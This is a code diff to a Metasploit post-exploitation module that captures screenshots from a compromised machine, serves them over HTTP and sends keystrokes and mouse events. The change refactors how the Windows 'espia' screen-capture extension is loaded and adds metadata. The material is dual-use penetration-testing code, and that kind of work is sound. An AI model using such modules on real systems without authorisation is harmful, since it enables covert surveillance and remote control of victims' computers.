@@ -25,12 +25,16 @@ class MetasploitModule < Msf::Post
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
-              espia_image_get_dev_screen
               stdapi_ui_desktop_screenshot
               stdapi_ui_send_keyevent
               stdapi_ui_send_mouse
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
         }
       )
     )
@@ -56,12 +60,20 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def supports_espia?(session)
+    return false unless session.platform == 'windows'
+
+    session.core.use('espia') unless session.espia
+    session.espia.present?
+  rescue RuntimeError
+    false
+  end
+
   # rubocop:disable Metrics/MethodLength
   def on_request_uri(cli, request)
     if request.uri =~ %r{/screenshot$}
       data = ''
-      if session.platform == 'windows'
-        session.console.run_single('load espia') unless session.espia
+      if supports_espia?(session)
         data = session.espia.espia_image_get_dev_screen
       else
         data = session.ui.screenshot(50)
